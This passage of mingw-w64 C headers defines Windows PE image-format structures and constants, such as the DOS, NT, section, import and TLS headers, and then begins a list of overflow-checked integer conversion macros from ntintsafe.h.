#define IMAGE_FILE_MACHINE_WCEMIPSV2  0x169
#define IMAGE_FILE_MACHINE_R3000      0x162
#define IMAGE_FILE_MACHINE_R10000     0x168
#define IMAGE_FILE_MACHINE_ALPHA      0x184
#define IMAGE_FILE_MACHINE_ALPHA64    0x0284
#define IMAGE_FILE_MACHINE_AXP64      IMAGE_FILE_MACHINE_ALPHA64
#define IMAGE_FILE_MACHINE_CEE        0xC0EE
#define IMAGE_FILE_MACHINE_TRICORE    0x0520
#define IMAGE_FILE_MACHINE_CEF        0x0CEF


//
// DOS Image Header Format
//
#include <pshpack2.h>
typedef struct _IMAGE_DOS_HEADER {
    USHORT e_magic;
    USHORT e_cblp;
    USHORT e_cp;
    USHORT e_crlc;
    USHORT e_cparhdr;
    USHORT e_minalloc;
    USHORT e_maxalloc;
    USHORT e_ss;
    USHORT e_sp;
    USHORT e_csum;
    USHORT e_ip;
    USHORT e_cs;
    USHORT e_lfarlc;
    USHORT e_ovno;
    USHORT e_res[4];
    USHORT e_oemid;
    USHORT e_oeminfo;
    USHORT e_res2[10];
    LONG e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
#include <poppack.h>


//
// Export/Import Format
//
#include <pshpack4.h>
typedef struct _IMAGE_EXPORT_DIRECTORY {
    ULONG Characteristics;
    ULONG TimeDateStamp;
    USHORT MajorVersion;
    USHORT MinorVersion;
    ULONG Name;
    ULONG Base;
    ULONG NumberOfFunctions;
    ULONG NumberOfNames;
    ULONG AddressOfFunctions;
    ULONG AddressOfNames;
    ULONG AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;


//
// Resource Data Entry Format
//
typedef struct _IMAGE_RESOURCE_DATA_ENTRY {
    ULONG OffsetToData;
    ULONG Size;
    ULONG CodePage;
    ULONG Reserved;
} IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;


//
// Load Configuration Directory Entry Format
//
typedef struct {
    ULONG   Size;
    ULONG   TimeDateStamp;
    USHORT  MajorVersion;
    USHORT  MinorVersion;
    ULONG   GlobalFlagsClear;
    ULONG   GlobalFlagsSet;
    ULONG   CriticalSectionDefaultTimeout;
    ULONG   DeCommitFreeBlockThreshold;
    ULONG   DeCommitTotalFreeThreshold;
    ULONG   LockPrefixTable;
    ULONG   MaximumAllocationSize;
    ULONG   VirtualMemoryThreshold;
    ULONG   ProcessHeapFlags;
    ULONG   ProcessAffinityMask;
    USHORT  CSDVersion;
    USHORT  Reserved1;
    ULONG   EditList;
    ULONG   SecurityCookie;
    ULONG   SEHandlerTable;
    ULONG   SEHandlerCount;
} IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32;

typedef struct {
    ULONG      Size;
    ULONG      TimeDateStamp;
    USHORT     MajorVersion;
    USHORT     MinorVersion;
    ULONG      GlobalFlagsClear;
    ULONG      GlobalFlagsSet;
    ULONG      CriticalSectionDefaultTimeout;
    ULONGLONG  DeCommitFreeBlockThreshold;
    ULONGLONG  DeCommitTotalFreeThreshold;
    ULONGLONG  LockPrefixTable;
    ULONGLONG  MaximumAllocationSize;
    ULONGLONG  VirtualMemoryThreshold;
    ULONGLONG  ProcessAffinityMask;
    ULONG      ProcessHeapFlags;
    USHORT     CSDVersion;
    USHORT     Reserved1;
    ULONGLONG  EditList;
    ULONGLONG  SecurityCookie;
    ULONGLONG  SEHandlerTable;
    ULONGLONG  SEHandlerCount;
} IMAGE_LOAD_CONFIG_DIRECTORY64, *PIMAGE_LOAD_CONFIG_DIRECTORY64;

#ifdef _WIN64
typedef IMAGE_LOAD_CONFIG_DIRECTORY64     IMAGE_LOAD_CONFIG_DIRECTORY;
typedef PIMAGE_LOAD_CONFIG_DIRECTORY64    PIMAGE_LOAD_CONFIG_DIRECTORY;
#else
typedef IMAGE_LOAD_CONFIG_DIRECTORY32     IMAGE_LOAD_CONFIG_DIRECTORY;
typedef PIMAGE_LOAD_CONFIG_DIRECTORY32    PIMAGE_LOAD_CONFIG_DIRECTORY;
#endif


//
// Base Relocation Format
//
typedef struct _IMAGE_BASE_RELOCATION {
	ULONG VirtualAddress;
	ULONG SizeOfBlock;
} IMAGE_BASE_RELOCATION, *PIMAGE_BASE_RELOCATION;


//
// Resource Format
//
typedef struct _IMAGE_RESOURCE_DIRECTORY {
    ULONG Characteristics;
    ULONG TimeDateStamp;
    USHORT MajorVersion;
    USHORT MinorVersion;
    USHORT NumberOfNamedEntries;
    USHORT NumberOfIdEntries;
} IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

typedef struct _IMAGE_RESOURCE_DIRECTORY_STRING {
    USHORT Length;
    CHAR NameString[ANYSIZE_ARRAY];
} IMAGE_RESOURCE_DIRECTORY_STRING, *PIMAGE_RESOURCE_DIRECTORY_STRING;


//
// Section Header Format
//
#define IMAGE_SIZEOF_SHORT_NAME              8
#define IMAGE_SIZEOF_SECTION_HEADER          40

typedef struct _IMAGE_SECTION_HEADER {
    UCHAR Name[IMAGE_SIZEOF_SHORT_NAME];
    union
    {
        ULONG PhysicalAddress;
        ULONG VirtualSize;
    } Misc;
    ULONG VirtualAddress;
    ULONG SizeOfRawData;
    ULONG PointerToRawData;
    ULONG PointerToRelocations;
    ULONG PointerToLinenumbers;
    USHORT NumberOfRelocations;
    USHORT NumberOfLinenumbers;
    ULONG Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

//
// Section Characteristics
//
#define IMAGE_SCN_CNT_CODE                   0x00000020
#define IMAGE_SCN_CNT_INITIALIZED_DATA       0x00000040
#define IMAGE_SCN_CNT_UNINITIALIZED_DATA     0x00000080

#define IMAGE_SCN_LNK_NRELOC_OVFL            0x01000000
#define IMAGE_SCN_MEM_DISCARDABLE            0x02000000
#define IMAGE_SCN_MEM_NOT_CACHED             0x04000000
#define IMAGE_SCN_MEM_NOT_PAGED              0x08000000
#define IMAGE_SCN_MEM_SHARED                 0x10000000
#define IMAGE_SCN_MEM_EXECUTE                0x20000000
#define IMAGE_SCN_MEM_READ                   0x40000000
#define IMAGE_SCN_MEM_WRITE                  0x80000000


//
// File Header Format
//
#define IMAGE_SIZEOF_FILE_HEADER             20

typedef struct _IMAGE_FILE_HEADER {
    USHORT Machine;
    USHORT NumberOfSections;
    ULONG TimeDateStamp;
    ULONG PointerToSymbolTable;
    ULONG NumberOfSymbols;
    USHORT SizeOfOptionalHeader;
    USHORT Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

//
// File Characteristics
//
#define IMAGE_FILE_RELOCS_STRIPPED           0x0001
#define IMAGE_FILE_EXECUTABLE_IMAGE          0x0002
#define IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004
#define IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008
#define IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010
#define IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020
#define IMAGE_FILE_BYTES_REVERSED_LO         0x0080
#define IMAGE_FILE_32BIT_MACHINE             0x0100
#define IMAGE_FILE_DEBUG_STRIPPED            0x0200
#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400
#define IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800
#define IMAGE_FILE_SYSTEM                    0x1000
#define IMAGE_FILE_DLL                       0x2000
#define IMAGE_FILE_UP_SYSTEM_ONLY            0x4000
#define IMAGE_FILE_BYTES_REVERSED_HI         0x8000


//
// Directory format.
//
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16

typedef struct _IMAGE_DATA_DIRECTORY {
    ULONG   VirtualAddress;
    ULONG   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;


//
// Optional Header Formats
//
typedef struct _IMAGE_OPTIONAL_HEADER {
    USHORT  Magic;
    UCHAR   MajorLinkerVersion;
    UCHAR   MinorLinkerVersion;
    ULONG   SizeOfCode;
    ULONG   SizeOfInitializedData;
    ULONG   SizeOfUninitializedData;
    ULONG   AddressOfEntryPoint;
    ULONG   BaseOfCode;
    ULONG   BaseOfData;
    ULONG   ImageBase;
    ULONG   SectionAlignment;
    ULONG   FileAlignment;
    USHORT  MajorOperatingSystemVersion;
    USHORT  MinorOperatingSystemVersion;
    USHORT  MajorImageVersion;
    USHORT  MinorImageVersion;
    USHORT  MajorSubsystemVersion;
    USHORT  MinorSubsystemVersion;
    ULONG   Win32VersionValue;
    ULONG   SizeOfImage;
    ULONG   SizeOfHeaders;
    ULONG   CheckSum;
    USHORT  Subsystem;
    USHORT  DllCharacteristics;
    ULONG   SizeOfStackReserve;
    ULONG   SizeOfStackCommit;
    ULONG   SizeOfHeapReserve;
    ULONG   SizeOfHeapCommit;
    ULONG   LoaderFlags;
    ULONG   NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct _IMAGE_ROM_OPTIONAL_HEADER {
    USHORT Magic;
    UCHAR  MajorLinkerVersion;
    UCHAR  MinorLinkerVersion;
    ULONG  SizeOfCode;
    ULONG  SizeOfInitializedData;
    ULONG  SizeOfUninitializedData;
    ULONG  AddressOfEntryPoint;
    ULONG  BaseOfCode;
    ULONG  BaseOfData;
    ULONG  BaseOfBss;
    ULONG  GprMask;
    ULONG  CprMask[4];
    ULONG  GpValue;
} IMAGE_ROM_OPTIONAL_HEADER, *PIMAGE_ROM_OPTIONAL_HEADER;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    USHORT      Magic;
    UCHAR       MajorLinkerVersion;
    UCHAR       MinorLinkerVersion;
    ULONG       SizeOfCode;
    ULONG       SizeOfInitializedData;
    ULONG       SizeOfUninitializedData;
    ULONG       AddressOfEntryPoint;
    ULONG       BaseOfCode;
    ULONGLONG   ImageBase;
    ULONG       SectionAlignment;
    ULONG       FileAlignment;
    USHORT      MajorOperatingSystemVersion;
    USHORT      MinorOperatingSystemVersion;
    USHORT      MajorImageVersion;
    USHORT      MinorImageVersion;
    USHORT      MajorSubsystemVersion;
    USHORT      MinorSubsystemVersion;
    ULONG       Win32VersionValue;
    ULONG       SizeOfImage;
    ULONG       SizeOfHeaders;
    ULONG       CheckSum;
    USHORT      Subsystem;
    USHORT      DllCharacteristics;
    ULONGLONG   SizeOfStackReserve;
    ULONGLONG   SizeOfStackCommit;
    ULONGLONG   SizeOfHeapReserve;
    ULONGLONG   SizeOfHeapCommit;
    ULONG       LoaderFlags;
    ULONG       NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

//
// Format Identifier Magics
//
#define IMAGE_NT_OPTIONAL_HDR32_MAGIC      0x10b
#define IMAGE_NT_OPTIONAL_HDR64_MAGIC      0x20b
#define IMAGE_ROM_OPTIONAL_HDR_MAGIC       0x107


#ifdef _WIN64
typedef IMAGE_OPTIONAL_HEADER64             IMAGE_OPTIONAL_HEADER;
typedef PIMAGE_OPTIONAL_HEADER64            PIMAGE_OPTIONAL_HEADER;
#define IMAGE_NT_OPTIONAL_HDR_MAGIC         IMAGE_NT_OPTIONAL_HDR64_MAGIC
#else
typedef IMAGE_OPTIONAL_HEADER32             IMAGE_OPTIONAL_HEADER;
typedef PIMAGE_OPTIONAL_HEADER32            PIMAGE_OPTIONAL_HEADER;
#define IMAGE_NT_OPTIONAL_HDR_MAGIC         IMAGE_NT_OPTIONAL_HDR32_MAGIC
#endif


//
// Nt Header Formats
//
typedef struct _IMAGE_NT_HEADERS64 {
    ULONG Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64;

typedef struct _IMAGE_NT_HEADERS {
    ULONG Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER32 OptionalHeader;
} IMAGE_NT_HEADERS32;

#ifdef _WIN64
typedef IMAGE_NT_HEADERS64                  IMAGE_NT_HEADERS;
#else
typedef IMAGE_NT_HEADERS32                  IMAGE_NT_HEADERS;
#endif

#ifndef _NTDDK_

typedef struct _IMAGE_NT_HEADERS *PIMAGE_NT_HEADERS32;
typedef struct _IMAGE_NT_HEADERS64 *PIMAGE_NT_HEADERS64;

#ifdef _WIN64
typedef PIMAGE_NT_HEADERS64                 PIMAGE_NT_HEADERS;
#else
typedef PIMAGE_NT_HEADERS32                 PIMAGE_NT_HEADERS;
#endif

#endif /* _NTDDK_ */

//
// Retreives the first image section header from the Nt Header
//
#define IMAGE_FIRST_SECTION( NtHeader ) ((PIMAGE_SECTION_HEADER)        \
    ((ULONG_PTR)(NtHeader) +                                            \
     FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                 \
     ((NtHeader))->FileHeader.SizeOfOptionalHeader   \
    ))

//
// Dll Characteristics
//
#define IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA       0x0020
#define IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE          0x0040
#define IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY       0x0080
#define IMAGE_DLLCHARACTERISTICS_NX_COMPAT             0x0100
#define IMAGE_DLLCHARACTERISTICS_NO_ISOLATION          0x0200
#define IMAGE_DLLCHARACTERISTICS_NO_SEH                0x0400
#define IMAGE_DLLCHARACTERISTICS_NO_BIND               0x0800
#define IMAGE_DLLCHARACTERISTICS_APPCONTAINER          0x1000
#define IMAGE_DLLCHARACTERISTICS_WDM_DRIVER            0x2000
#define IMAGE_DLLCHARACTERISTICS_GUARD_CF              0x4000
#define IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE 0x8000

//
// Loader Flags
//
#define IMAGE_LOADER_FLAGS_COMPLUS       0x00000001
#define IMAGE_LOADER_FLAGS_SYSTEM_GLOBAL 0x01000000

//
// Directory Entry Specifiers
//
#define IMAGE_DIRECTORY_ENTRY_EXPORT          0
#define IMAGE_DIRECTORY_ENTRY_IMPORT          1
#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3
#define IMAGE_DIRECTORY_ENTRY_SECURITY        4
#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5
#define IMAGE_DIRECTORY_ENTRY_DEBUG           6
#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7
#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8
#define IMAGE_DIRECTORY_ENTRY_TLS             9
#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10
#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11
#define IMAGE_DIRECTORY_ENTRY_IAT            12
#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13
#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14


//
// Import Formats
//
typedef struct _IMAGE_IMPORT_BY_NAME {
    USHORT  Hint;
    UCHAR   Name[1];
} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;

#include <pshpack8.h>
typedef struct _IMAGE_THUNK_DATA64 {
    union {
        ULONGLONG ForwarderString;
        ULONGLONG Function;
        ULONGLONG Ordinal;
        ULONGLONG AddressOfData;
    } u1;
} IMAGE_THUNK_DATA64, *PIMAGE_THUNK_DATA64;
#include <poppack.h>

typedef struct _IMAGE_THUNK_DATA32 {
    union {
        ULONG ForwarderString;
        ULONG Function;
        ULONG Ordinal;
        ULONG AddressOfData;
    } u1;
} IMAGE_THUNK_DATA32, *PIMAGE_THUNK_DATA32;

#define IMAGE_ORDINAL_FLAG64 0x8000000000000000ULL
#define IMAGE_ORDINAL_FLAG32 0x80000000
#define IMAGE_ORDINAL64(Ordinal) (Ordinal & 0xffff)
#define IMAGE_ORDINAL32(Ordinal) (Ordinal & 0xffff)
#define IMAGE_SNAP_BY_ORDINAL64(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG64) != 0)
#define IMAGE_SNAP_BY_ORDINAL32(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG32) != 0)


//
// Thread Local Storage (TLS)
//
typedef
VOID
(NTAPI *PIMAGE_TLS_CALLBACK) (
    PVOID DllHandle,
    ULONG Reason,
    PVOID Reserved
);

typedef struct _IMAGE_TLS_DIRECTORY64 {
    ULONGLONG   StartAddressOfRawData;
    ULONGLONG   EndAddressOfRawData;
    ULONGLONG   AddressOfIndex;
    ULONGLONG   AddressOfCallBacks;
    ULONG   SizeOfZeroFill;
    ULONG   Characteristics;
} IMAGE_TLS_DIRECTORY64, *PIMAGE_TLS_DIRECTORY64;

typedef struct _IMAGE_TLS_DIRECTORY32 {
    ULONG   StartAddressOfRawData;
    ULONG   EndAddressOfRawData;
    ULONG   AddressOfIndex;
    ULONG   AddressOfCallBacks;
    ULONG   SizeOfZeroFill;
    ULONG   Characteristics;
} IMAGE_TLS_DIRECTORY32, *PIMAGE_TLS_DIRECTORY32;

#ifdef _WIN64
#define IMAGE_ORDINAL_FLAG              IMAGE_ORDINAL_FLAG64
#define IMAGE_ORDINAL(Ordinal)          IMAGE_ORDINAL64(Ordinal)
typedef IMAGE_THUNK_DATA64              IMAGE_THUNK_DATA;
typedef PIMAGE_THUNK_DATA64             PIMAGE_THUNK_DATA;
#define IMAGE_SNAP_BY_ORDINAL(Ordinal)  IMAGE_SNAP_BY_ORDINAL64(Ordinal)
typedef IMAGE_TLS_DIRECTORY64           IMAGE_TLS_DIRECTORY;
typedef PIMAGE_TLS_DIRECTORY64          PIMAGE_TLS_DIRECTORY;
#else
#define IMAGE_ORDINAL_FLAG              IMAGE_ORDINAL_FLAG32
#define IMAGE_ORDINAL(Ordinal)          IMAGE_ORDINAL32(Ordinal)
typedef IMAGE_THUNK_DATA32              IMAGE_THUNK_DATA;
typedef PIMAGE_THUNK_DATA32             PIMAGE_THUNK_DATA;
#define IMAGE_SNAP_BY_ORDINAL(Ordinal)  IMAGE_SNAP_BY_ORDINAL32(Ordinal)
typedef IMAGE_TLS_DIRECTORY32           IMAGE_TLS_DIRECTORY;
typedef PIMAGE_TLS_DIRECTORY32          PIMAGE_TLS_DIRECTORY;
#endif

typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    _ANONYMOUS_UNION union {
        ULONG   Characteristics;
        ULONG   OriginalFirstThunk;
    } DUMMYUNIONNAME;
    ULONG   TimeDateStamp;
    ULONG   ForwarderChain;
    ULONG   Name;
    ULONG   FirstThunk;
} IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;

#include <poppack.h>


#endif /* _NTIMAGE_ */


```

`include/ddk/ntintsafe.h`:

```h
/**
 * This file has no copyright assigned and is placed in the Public Domain.
 * This file is part of the mingw-w64 runtime package.
 * No warranty is given; refer to the file DISCLAIMER.PD within this package.
 */

#ifndef _NTINTSAFE_H_INCLUDED_
#define _NTINTSAFE_H_INCLUDED_

#include <winapifamily.h>

#if WINAPI_FAMILY_PARTITION(WINAPI_PARTITION_APP)

#include <minwindef.h>
#include <specstrings.h>

#ifndef __MINGW_INTSAFE_WORKS
#ifdef __clang__
#if __has_builtin(__builtin_add_overflow)
#define __MINGW_INTSAFE_WORKS
#endif
#elif __GNUC__ >= 5
#define __MINGW_INTSAFE_WORKS
#endif
#endif

#ifdef __MINGW_INTSAFE_WORKS

#ifndef __MINGW_INTSAFE_API
#define __MINGW_INTSAFE_API FORCEINLINE
#endif

/** If CHAR is unsigned, use static inline for functions that operate
on chars.  This avoids the risk of linking to the wrong function when
different translation units with different types of chars are linked
together, and code using signed chars will not be affected. */
#ifndef __MINGW_INTSAFE_CHAR_API
#ifdef __CHAR_UNSIGNED__
#define __MINGW_INTSAFE_CHAR_API static inline
#else
#define __MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_API
#endif
#endif

#define __MINGW_INTSAFE_BODY(operation, x, y, overflow)	\
{ \
  if (__builtin_##operation##_overflow(x, y, result)) \
  { \
      *result = overflow; \
      return STATUS_INTEGER_OVERFLOW; \
  } \
  return STATUS_SUCCESS; \
}

#define __MINGW_INTSAFE_CONV_UCHAR(name, type_src, type_dest) \
    NTSTATUS Rtl##name(type_src operand, type_dest * result) \
    __MINGW_INTSAFE_BODY(add, operand, 0, 0)

#define __MINGW_INTSAFE_CONV(name, type_src, type_dest) \
    NTSTATUS Rtl##name(type_src operand, type_dest * result) \
    __MINGW_INTSAFE_BODY(add, operand, 0, ~0)

#define __MINGW_INTSAFE_MATH(name, type, operation) \
    NTSTATUS Rtl##name(type x, type y, type * result) \
    __MINGW_INTSAFE_BODY(operation, x, y, ~0)

#ifdef __CHAR_UNSIGNED__
#define __MINGW_INTSAFE_CONV_CHAR __MINGW_INTSAFE_CONV_UCHAR
#else
#define __MINGW_INTSAFE_CONV_CHAR __MINGW_INTSAFE_CONV
#endif

__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UInt8ToInt8, UINT8, INT8)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(UInt8ToChar, UINT8, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ByteToInt8, BYTE, INT8)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(ByteToChar, BYTE, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(Int8ToUChar, INT8, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int8ToUInt8, INT8, UINT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int8ToUShort, INT8, USHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int8ToUInt, INT8, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int8ToULong, INT8, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int8ToUIntPtr, INT8, UINT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int8ToULongPtr, INT8, ULONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int8ToULongLong, INT8, ULONGLONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(UShortToUChar, USHORT, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UShortToUInt8, USHORT, UINT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UShortToByte, USHORT, BYTE)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UShortToInt8, USHORT, INT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UShortToShort, USHORT, SHORT)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(UShortToChar, USHORT, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(WordToUChar, WORD, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(WordToByte, WORD, BYTE)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(WordToShort, WORD, SHORT)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(WordToChar, WORD, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(ShortToUChar, SHORT, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ShortToUInt8, SHORT, UINT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ShortToByte, SHORT, BYTE)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ShortToInt8, SHORT, INT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ShortToUShort, SHORT, USHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ShortToWord, SHORT, WORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ShortToUInt, SHORT, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ShortToULong, SHORT, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ShortToUIntPtr, SHORT, UINT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ShortToULongPtr, SHORT, ULONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ShortToDWordPtr, SHORT, DWORD_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ShortToULongLong, SHORT, ULONGLONG)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(ShortToChar, SHORT, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(UIntToUChar, UINT, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntToUInt8, UINT, UINT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntToByte, UINT, BYTE)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntToInt8, UINT, INT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntToUShort, UINT, USHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntToWord, UINT, WORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntToShort, UINT, SHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntToLong, UINT, LONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntToInt, UINT, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntToIntPtr, UINT, INT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntToPtrdiffT, UINT, ptrdiff_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntToLongPtr, UINT, LONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntToSSIZET, UINT, SSIZE_T)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(UIntToChar, UINT, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(ULongToUChar, ULONG, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongToUInt8, ULONG, UINT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongToByte, ULONG, BYTE)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongToInt8, ULONG, INT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongToUShort, ULONG, USHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongToWord, ULONG, WORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongToShort, ULONG, SHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongToUInt, ULONG, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongToLong, ULONG, LONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongToInt, ULONG, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongToUIntPtr, ULONG, UINT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongToIntPtr, ULONG, INT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongToPtrdiffT, ULONG, ptrdiff_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongToLongPtr, ULONG, LONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongToSSIZET, ULONG, SSIZE_T)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV(ULongToChar, ULONG, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(DWordToUChar, DWORD, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordToByte, DWORD, BYTE)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordToUShort, DWORD, USHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordToWord, DWORD, WORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordToShort, DWORD, SHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordToUInt, DWORD, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordToLong, DWORD, LONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordToInt, DWORD, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordToUIntPtr, DWORD, UINT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordToIntPtr, DWORD, INT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordToPtrdiffT, DWORD, ptrdiff_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordToLongPtr, DWORD, LONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordToSSIZET, DWORD, SSIZE_T)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(DWordToChar, DWORD, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(LongToUChar, LONG, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToUInt8, LONG, UINT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToByte, LONG, BYTE)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToInt8, LONG, INT8)
